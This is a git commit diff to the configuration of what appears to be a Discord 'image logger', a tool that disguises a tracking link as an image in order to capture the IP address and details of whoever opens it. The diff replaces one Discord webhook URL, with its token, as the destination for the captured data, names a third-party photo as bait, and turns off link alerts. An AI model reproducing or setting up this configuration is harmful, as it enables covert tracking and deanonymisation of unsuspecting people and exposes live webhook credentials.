6554c69790be8dcd086cea2ffc3851979e4f273f
amsterdamr042-arch <amsterdamr042@gmail.com>
2025-11-22 01:40:23 +0100

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441587413657845874/AyeqFT0qkb5Wqz2TUausvdFRek1ndW52tNcGQFV8JfkPj7R3tiU4hpchON3wsi3LLyvF",
+    "webhook": "https://discord.com/api/webhooks/1441583410283020358/8s7BGDwQeYsPjTSuk2O4YD2t1JIeUfZHVCfj1_IfVFQ-kW8TBEC0ezpFBmz3SY3gys5a",
     "image": "https://volksdans-culemborg.nl/DanceCity/fotos/Ozan1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
